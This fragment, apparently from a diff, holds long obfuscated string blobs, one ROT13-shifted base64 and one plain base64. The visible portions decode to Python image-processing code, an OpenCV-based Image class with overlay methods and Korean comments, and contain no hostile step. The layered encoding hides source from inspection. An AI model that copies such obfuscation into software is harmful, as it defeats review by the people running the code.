NtMaWuoJHtCFOwqwVhL3M0D29fo3VbMaWuoJHfVTA2Zv5QG0kCHy9FE0VlDxqFDFxXVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPOzpzSgMFN9VTA2Zv5wqaEQo2kipvuzpzSgMFjtL3LlYxACGR9FK1WUDwWPE1VcPvNtVPNtVPNtpzI0qKWhVTMlLJ1yPtbtVPNtMTIzVT92MKWfLKxbp2IfMvjtnJ1aXGbXVPNtVPNtVPOjLKAmPtbtVPNtMTIzVUWiqTS0MFumMJkzYPOxMJqlMJHfVUWyp2y6MG1TLJkmMFx6PvNtVPNtVPNtMaWuoJHtCFOhpP5wo3O5XUAyoTLhK19zpzSgMFxXPvNtVPNtVPNtnJLtpzImnKcyBtbtVPNtVPNtVPNtVPOzpzSgMFN9VTygqKEcoUZhpz90LKEyXTMlLJ1yYPOxMJqlMJHcPvNtVPNtVPNtMJkmMGbXVPNtVPNtVPNtVPNtMaWuoJHtCFOcoKI0nJkmYaWiqTS0MI9vo3IhMPuzpzSgMFjtMTIapzIyXDbXVPNtVPNtVPOjpzyhqPtvXvbdVvjtMaWuoJHhp2uupTHcPvNtVPNtVPNtpzI0qKWhVRygLJqyXTMlLJ1yXDbXVPNtVTEyMvOzoTyjXUAyoTLfVT1iMTH9VztvXGbXVPNtVPNtVPNvVvVXVPNtVPNtVPNanPptBvQfbbmfzeNXVPNtVPNtVPNaqvptBvQft4UgyMtXVPNtVPNtVPNanULaVQbt7VBO7MJL7XXZ7WdjPvNtVPNtVPNtVvVvPvNtVPNtVPNtMaWuoJHtCFOhpP5wo3O5XUAyoTLhK19zpzSgMFxXVPNtVPNtVPOcMvOgo2EyVQ09VPW2VwbXVPNtVPNtVPNtVPNtMaWuoJHtCFOwqwVhMzkcpPuzpzSgMFjtZPxXVPNtVPNtVPOyoTyzVT1iMTHtCG0tVztvBtbtVPNtVPNtVPNtVPOzpzSgMFN9VTA2Zv5zoTyjXTMlLJ1yYPNkXDbtVPNtVPNtVTIfp2H6PvNtVPNtVPNtVPNtVTMlLJ1yVQ0tL3LlYzMfnKNbMaWuoJHfVP0kXDbtVPNtVPNtVUWyqUIlovOWoJSaMFuzpzSgMFxXPvNtVPOxMJLtp2S2MFumMJkzYPOznJkyozSgMFx6PvNtVPNtVPNtVlNvVvVXVPNtVPNtVPNwVTcjM+2ZwBlqiBhuaPQfbVQfadHXVPNtVPNtVPNwVPVvVtbtVPNtVPNtVPZtnJLtpTS0nPNuCFOBo25yVTShMPOjLKEbYzIhMUA3nKEbXPpiWlx6PvNtVPNtVPNtVlNtVPNtpTS0nPN9VUOuqTuoBv0kKDbXVPNtVPNtVPNwVTyzVT5iqPOipl5jLKEbYzymMTylXUOuqTtcBtbtVPNtVPNtVPZtVPNtVT9mYz1eMTylXUOuqTtcPtbtVPNtVPNtVPZtVlQgwVmfaomfaoGecbGfaLNt7XPI7MJtVBlVzPQfy4oev6DhPvNtVPNtVPNtVlOhLJ1yVQ0tp3ElXUWiqJ5xXUEcoJHhqTygMFtcVPbtZGNjZPxcPvNtVPNtVPNtVlOwqwVhnJ13pzy0MFuzW3gjLKEbsF97ozSgMK0hnaOaWljtp2IfMv5sK2MlLJ1yXDbtVPNtVPNtVPZtpUWcoaDbMvq7pTS0nU0ir25uoJI9YzcjMlpfVPsfaLDt7XPN7W6y7MJL7WvN7Vd164hV64hxWlxXVPNtVPNtVPOjnJ1aVQ0tp2IfMv5sK2MlLJ1yK3EiK3OcoPumMJkzYy9sMaWuoJHhL29jrFtcYPOmMJkzYy9sM2I0K2AioT9lp3OuL2HcPvNtVPNtVPNtpTygMl5mLKMyXTMcoTIhLJ1yXDbtVPNtVPNtVPZtpUWcoaDbMvq7MzyfMJ5uoJI9WljtW+lquPQfbVQfadKgyMwfzVQfveKev4wev6DaXDbtVPNtVPNtVUWyqUIlovOmMJkzPtbtVPNtDUOlo3OypaE5PvNtVPOxMJLtpTyfXUAyoTLcBtbtVPNtVPNtVUWyqUIlovOmMJkzYaEiK3OcoTygLJqyXPxXPvNtVPOxMJLtqT9spTyfnJ1uM2Hbp2IfMvx6PvNtVPNtVPNtpzI0qKWhVUAyoTLhK19zpzSgMI90o19jnJjbp2IfMv5sK2MlLJ1yYzAipUxbXFjtp2IfMv5sK2qyqS9wo2kipaAjLJAyXDbXVPNtVROwoTSmp21yqTuiMNbtVPNtMTIzVTMlo21spTyfnJ1uM2HbL2kmYPOjnJ1aXGbXVPNtVPNtVPOzpzSgMFN9VT5jYzSmLKWlLKxbpTygMlxXVPNtVPNtVPOzpzSgMFN9VTA2Zv5wqaEQo2kipvuzpzSgMFjtL3LlYxACGR9FK1WUDwWPE1VcPvNtVPNtVPNtpzI0qKWhVRygLJqyXTMlLJ1yXDbXVPNtVPZtYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gPvNtVPNwVRuGIy9Zo3qypy9MMJkfo3ptCFNbAljkAFjlAQNcPvNtVPNwVRuGIy9IpUOypy9MMJkfo3ptCFNbZmNfZPjlAGHcPvNtVPNwVTA2ZvOzqJ5wqTyiotbtVPNtMTIzVTyhK3WuozqyXUAyoTLfVTkiq2IlYPO1pUOypvx6PvNtVPNtVPNtnJLtoz90VTymnJ5mqTShL2HboT93MKVfVTkcp3DcBtbtVPNtVPNtVPNtVPNwVTkiq2IlVQ0tJ2kiq2IlYPNmZPjtZmOqPvNtVPNtVPNtVPNtVTkiq2IlVQ0tJ2kiq2IlYPNkAFjtZwDjKDbXVPNtVPNtVPOcMvOho3DtnKAcoaA0LJ5wMFu1pUOypvjtoTymqPx6PvNtVPNtVPNtVPNtVPZtqKOjMKVtCFOoqKOjMKVfVQV1AFjtZwH1KDbtVPNtVPNtVPNtVPO1pUOypvN9VSg1pUOypvjtZPjtZwH1KDbXVPNtVPNtVPOfo3qypvN9VT5jYzSlpzS5XTkiq2IlXDbtVPNtVPNtVUIjpTIlVQ0toaNhLKWlLKxbqKOjMKVcPvNtVPNtVPNtnUA2VQ0tL3LlYzA2qRAioT9lXUAyoTLhnJ1uM2HfVTA2Zv5QG0kCHy9PE1VlFSAJXDbtVPNtVPNtVT1up2ftCFOwqwVhnJ5FLJ5aMFubp3LfVTkiq2IlYPO1pUOypvxXVPNtVPNtVPOlMKE1pz4tFJ1uM2HboaNhL29jrFugLKAeXFxXPvNtVPOxMJLtMzyhMS9wo250o3IlplumMJkzYPOgnJ49ZGNjXGbXVPNtVPNtVPNwVTAioaEiqKWmYPObnJIlLKWwnUxtCFOwqwVhMzyhMRAioaEiqKWmXUAyoTLhK19zpzSgMFjtL3LlYyWSISWsEIuHEIWBDHjfVTA2Zv5QFRSWGy9OHSOFG1usGx9BEFxXVPNtVPNtVPNwVTAioaEiqKWmYPObnJIlLKWwnUxtCFOwqwVhMzyhMRAioaEiqKWmXUAyoTLhK19zpzSgMFjtL3LlYyWSISWsD0ACGINfVTA2Zv5QFRSWGy9OHSOFG1usGx9BEFxXVPNtVPNtVPOwo250o3IlpljtnTyypzSlL2u5VQ0tL3LlYzMcozEQo250o3IlpltXVPNtVPNtVPNtVPNtp2IfMv5sK2MlLJ1yYPOwqwVhHxIHHy9ZFIAHYPOwqwVhD0uOFH5sDIODHx9LK1AWGIOZEDbtVPNtVPNtVPxXVPNtVPNtVPOwoaEmVQ0tJ10XVPNtVPNtVPOzo3VtnFOcovOlLJ5aMFtjYPOfMJ4bL29hqT91paZcXGbXVPNtVPNtVPNtVPNtnJLtoTIhXTAioaEiqKWmJ2yqXFN+VQN6PvNtVPNtVPNtVPNtVPNtVPNwVUWyoJ92MFOmoJSfoPOiLzcyL3EmPvNtVPNtVPNtVPNtVPNtVPOupzIuVQ0tL3LlYzAioaEiqKWOpzIuXTAioaEiqKWmJ2yqXDbtVPNtVPNtVPNtVPNtVPNtnJLtLKWyLFN8VT1cowbXVPNtVPNtVPNtVPNtVPNtVPNtVPOwo250nJ51MDbtVPNtVPNtVPNtVPNtVPNtL250pl5upUOyozDbL29hqT91paAonI0cPvNtVPNtVPNtVPNtVPNtVPNwVBhjyBlngBhHdrhjyrlXcBhyiPQdf4GfteQgyMwevcDt7WJR656LVBl9yBhGaNbtVPNtVPNtVPNtVPNtVPNtVlOlMJA0VQ0tL3LlYz1coxSlMJSFMJA0XTAioaEiqKWmJ2yqXDbtVPNtVPNtVPNtVPNtVPNtVlOvo3ttCFOwqwVhLz94HT9coaEmXUWyL3DcPvNtVPNtVPNtVPNtVPNtVPNwVUOlnJ50XPpdXvbtWljtLz94XDbtVPNtVPNtVPNtVPNtVPNtVlOwoaEmYzSjpTIhMPuvo3tcPvNtVPNtVPNtpzI0qKWhVTAhqUZXPvNtVPOxMJLtMUWuq19wo250o3IlplumMJkzYPOwo250o3IlpljtqUu0CIElqJHcBtbtVPNtVPNtVTMlLJ1yVQ0tp2IfMv5sK2MlLJ1yYzAipUxbXDbXVPNtVPNtVPNwVP0gYF0gYF0gYF0gYF0gYFOBolNkYvNgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0XVPNtVPNtVPNwVTMipvOcVTyhVUWuozqyXTkyovuwo250o3IlplxcBtbtVPNtVPNtVPZtVPNtVTSlMJRtCFOwqwVhL29hqT91pxSlMJRbL29hqT91paAonI0cPvNtVPNtVPNtVlNtVPNtL3LlYzElLKqQo250o3IlpluzpzSgMFjtJ2AioaEiqKWmJ2yqKFjtZPjtXQNfVQNfVQV1AFxfVQVcPvNtVPNtVPNtVlNtVPNtnJLtqUu0BtbtVPNtVPNtVPZtVPNtVPNtVPOwqwVhpUI0ITI4qPuzpzSgMFjtMvq7LKWyLK0br2y9XFpfVUE1pTkyXTAioaEiqKWmJ2yqJmOqJmOqXFjtL3LlYxMCGyEsFRIFH0uSJI9QG01DGRILYPNjYwHfVPtjYPNlAGHfVQNcYPNkXDbXVPNtVPNtVPNwVP0gYF0gYF0gYF0gYF0gYFOBolNlYvNgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0XVPNtVPNtVPNwVTu0qUOmBv8iq2IvozS1qTImYaEcp3EipaxhL29gYmRlAmNXVPNtVPNtVPNwVBlIuBhrzPQegbQegbGfaLDt7MJb6ehLVBd3hBhtcBhCuPQfaVGfaMtt6er466njVBhPgBlndrdmiPQehLGfvesgyMwev6DhVBlqiBhYdPQfiMGedMwgvetXVPNtVPNtVPOzo3VtL250VTyhVTAioaEiqKWmBtbtVPNtVPNtVPNtVPOypUAcoT9hVQ0tZP4jZvNdVTA2Zv5upzAZMJ5aqTtbL250YPOHpaIyXDbtVPNtVPNtVPNtVPOupUOlo3ttCFOwqwVhLKOjpz94HT9frHEDXTAhqPjtMKOmnJkiovjtIUW1MFxXVPNtVPNtVPNtVPNtpUWcoaDboTIhXTSjpUWirPxcPvNtVPNtVPNtVPNtVTA2Zv5xpzS3D29hqT91paZbMaWuoJHfVSgupUOlo3uqYPNjYPNbZPjtZwH1YPNlAGHcYPN1XDbtVPNtVPNtVUWyqUIlovOWoJSaMFuzpzSgMFjtp2IfMv5sK2AioT9lH3OuL2HcPtbtVPNtVlOxMJLtMUWuq19wo250o3IlplumMJkzYPOwo250o3IlpljtqUu0CIElqJHcBtbtVPNtVlNtVPNtMaWuoJHtCFOmMJkzYy9sMaWuoJHhL29jrFtcPvNtVPNwVPNtVPOzo3VtnFOcovOlLJ5aMFufMJ4bL29hqT91paZcXGbXVPNtVPZtVPNtVPNtVPOvo3ttCFOhpP5coaDjXTAioaEiqKWmJ2yqXDbtVPNtVlNtVPNtVPNtVTA2Zv5xpzS3D29hqT91paZbMaWuoJHfVSgvo3uqYPNjYPNbZPjtZwH1YPNjXFjtZlxXVPNtVPZtVPNtVUWyqUIlovOWoJSaMFuzpzSgMFjtp2IfMv5sK2AioT9lH3OuL2HcPtbtVPNtMTIzVTSjpTk5K21up2fbp2IfMvjtoJSmn19coJpcBtbtVPNtVPNtVTygMlN9VTA2Zv5vnKE3nKAyK2ShMPumMJkzYy9sMaWuoJHfVUAyoTLhK19zpzSgMFjtoJSmnm1gLKAeK2ygMl5zpzSgMFxXVPNtVPNtVPOlMKE1pz4tFJ1uM2HbnJ1aXDbXVPNtVTEyMvOgLKAenJ5aXUAyoTLfVT1up2gsnJ1aXGbXVPNtVPNtVPOcoJptCFOwqwVhLzy0q2ymMI9uozDbp2IfMv5sK2MlLJ1yYPOmMJkzYy9sMaWuoJHfVT1up2f9oJSmn19coJphMaWuoJHcPvNtVPNtVPNtpzI0qKWhVRygLJqyXTygMlxXPvNtVPOxMJLtLzy0q2ymMI9uozDbp2IfMvjtnJ1aYPOgLKAeK2ygMm1Bo25yXGbXVPNtVPNtVPNvVvVXVPNtVPNtVPQdfWafaLNtp2uupTKec4jt7XPO7Wdc6ePN64dyPvNtVPNtVPNtVvVvPvNtVPNtVPNtnJLtoJSmn19coJp6PvNtVPNtVPNtVPNtVTygMlN9VTA2Zv5vnKE3nKAyK2ShMPumMJkzYy9sMaWuoJHfVTygMl5zpzSgMFjtoJSmnm1gLKAeK2ygMl5zpzSgMFxXVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPOcoJptCFOwqwVhLzy0q2ymMI9uozDbp2IfMv5sK2MlLJ1yYPOcoJphMaWuoJHcPvNtVPNtVPNtpzI0qKWhVRygLJqyXTygMlxXPvNtVPOxMJLtLzy0q2ymMI9ipvumMJkzYPOcoJpfVT1up2gsnJ1aCH5iozHcBtbtVPNtVPNtVPVvVtbtVPNtVPNtVBdjzrlqtPOmnTSjMrhawPQfbVUfzdadfVQevdHXVPNtVPNtVPNvVvVXVPNtVPNtVPOcMvOgLKAeK2ygMmbXVPNtVPNtVPNtVPNtnJ1aVQ0tL3LlYzWcqUqcp2Iso3Vbp2IfMv5sK2MlLJ1yYPOcoJphMaWuoJHfVT1up2f9oJSmn19coJphMaWuoJHcPvNtVPNtVPNtMJkmMGbXVPNtVPNtVPNtVPNtnJ1aVQ0tL3LlYzWcqUqcp2Iso3Vbp2IfMv5sK2MlLJ1yYPOcoJphMaWuoJHcPvNtVPNtVPNtpzI0qKWhVRygLJqyXTygMlxXPvNtVPOxMJLtLzy0q2ymMI94o3Vbp2IfMvjtnJ1aYPOgLKAeK2ygMlx6PvNtVPNtVPNtVvVvPvNtVPNtVPNt6ePM7W2NVUAbLKOy66rZVBlttrlndrdjtBhXcDbtVPNtVPNtVPVvVtbtVPNtVPNtVTyzVT1up2gsnJ1aBtbtVPNtVPNtVPNtVPOcoJptCFOwqwVhLzy0q2ymMI94o3Vbp2IfMv5sK2MlLJ1yYPOcoJphMaWuoJHfVT1up2f9oJSmn19coJphMaWuoJHcPvNtVPNtVPNtMJkmMGbXVPNtVPNtVPNtVPNtnJ1aVQ0tL3LlYzWcqUqcp2IsrT9lXUAyoTLhK19zpzSgMFjtnJ1aYzMlLJ1yXDbtVPNtVPNtVUWyqUIlovOWoJSaMFucoJpcPtbtVPNtMTIzVTWcqUqcp2Isoz90XUAyoTLcBtbtVPNtVPNtVTygMlN9VTA2Zv5vnKE3nKAyK25iqPumMJkzYy9sMaWuoJHcPvNtVPNtVPNtpzI0qKWhVRygLJqyXTygMlxXPvNtVPNwVP0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gPvNtVPOxMJLtK19wo2kipy9lLzqsqT9sLzqlXUAyoTLfVTAioT9lXGbXVPNtVPNtVPOlYPOaYPOvVQ0tL29fo3VXVPNtVPNtVPOlMKE1pz4tXTVfVTpfVUVcPtbtVPNtMTIzVS9sL29fo3WsLzqlK3EiK3WaLvumMJkzYPOwo2kipvx6PvNtVPNtVPNtLvjtMljtpvN9VTAioT9lPvNtVPNtVPNtpzI0qKWhVPulYPOaYPOvXDbXVPNtVPZtYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF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'
-god = 'uOyngOyXkOuKlCDsmKTrsoTroIjsnbQg7ZWgIOyImCDsl4bsirXri4jri6QiKQogICAgICAgICAgICByZXR1cm4gSW1hZ2UobnAuY29weShzZWxmLl9fZnJhbWUpLCBDb2xvclNwYWNlLkdSQVkpCgogICAgICAgIGgsIHcsIGMgPSBpbWcuZnJhbWUuc2hhcGUKICAgICAgICBpZiBjID09IDQ6CiAgICAgICAgICAgIGZyYW1lID0gc2VsZi5fX3RyYW5zcGFyZW50X292ZXJsYXkoaW1nLCBwb3M9KHgsIHkpKQogICAgICAgICAgICByZXR1cm4gSW1hZ2UoZnJhbWUsIHNlbGYuX19jb2xvclNwYWNlKQogICAgICAgIGVsaWYgYyA9PSAzOgogICAgICAgICAgICBmcmFtZSA9IG5wLmNvcHkoc2VsZi5fX2ZyYW1lKQogICAgICAgICAgICBmcmFtZVt5IDogeSArIGgsIHggOiB4ICsgd10gPSBpbWcuZnJhbWUKICAgICAgICAgICAgcmV0dXJuIEltYWdlKGZyYW1lLCBzZWxmLl9fY29sb3JTcGFjZSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludCgiR1JBWSDsnbTrr7jsp4Dsl5DripQg7Jik67KE66CI7J20IO2VoCDsiJgg7JeG7Iq164uI64ukIikKICAgICAgICAgICAgcmV0dXJuIEltYWdlKG5wLmNvcHkoc2VsZi5fX2ZyYW1lKSwgQ29sb3JTcGFjZS5HUkFZKQoKICAgIGRlZiBvdmVybGF5KHNlbGYsIHgsIHksIGltZyk6CiAgICAgICAgIyBibGl0KCntlajsiJjsmYAg6rCZ7J2A642wLgogICAgICAgIGlmIHNlbGYuX19jb2xvclNwYWNlID09IENvbG9yU3BhY2UuR1JBWToKICAgICAgICAgICAgcHJpbnQoIkdSQVkg7J2066+47KeA7JeQ64qUIOyYpOuyhOugiOydtCDtlaAg7IiYIOyXhuyKteuLiOuLpCIpCiAgICAgICAgICAgIHJldHVybiBJbWFnZShucC5jb3B5KHNlbGYuX19mcmFtZSksIENvbG9yU3BhY2UuR1JBWSkKCiAgICAgICAgaCwgdywgYyA9IGltZy5mcmFtZS5zaGFwZQogICAgICAgIGlmIGMgPT0gNDoKICAgICAgICAgICAgZnJhbWUgPSBzZWxmLl9fdHJhbnNwYXJlbnRfb3ZlcmxheShpbWcsIHBvcz0oeCwgeSkpCiAgICAgICAgICAgIHJldHVybiBJbWFnZShmcmFtZSwgc2VsZi5fX2NvbG9yU3BhY2UpCiAgICAgICAgZWxpZiBjID09IDM6CiAgICAgICAgICAgIGZyYW1lID0gbnAuY29weShzZWxmLl9fZnJhbWUpCiAgICAgICAgICAgIGZyYW1lW3kgOiB5ICsgaCwgeCA6IHggKyB3XSA9IGltZy5mcmFtZQogICAgICAgICAgICByZXR1cm4gSW1hZ2UoZnJhbWUsIHNlbGYuX19jb2xvclNwYWNlKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KCJHUkFZIOydtOuvuOyngOyXkOuKlCDsmKTrsoTroIjsnbQg7ZWgIOyImCDsl4bsirXri4jri6QiKQogICAgICAgICAgICByZXR1cm4gSW1hZ2UobnAuY29weShzZWxmLl9fZnJhbWUpLCBDb2xvclNwYWNlLkdSQVkpCgogICAgZGVmIF9fdHJhbnNwYXJlbnRfb3ZlcmxheShzZWxmLCBvdmVybGF5LCBwb3M9KDAsIDApLCBzY2FsZT0xKToKICAgICAgICAiI